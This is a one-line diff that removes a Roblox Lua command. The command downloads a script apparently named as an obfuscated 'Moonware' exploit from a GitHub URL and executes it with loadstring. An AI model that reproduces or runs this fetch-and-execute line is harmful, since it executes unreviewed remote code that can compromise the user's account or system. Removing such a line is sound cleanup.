@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Tankz3502/MoonwareBetaV4/main/Protected_3499244333154518.lua"))()
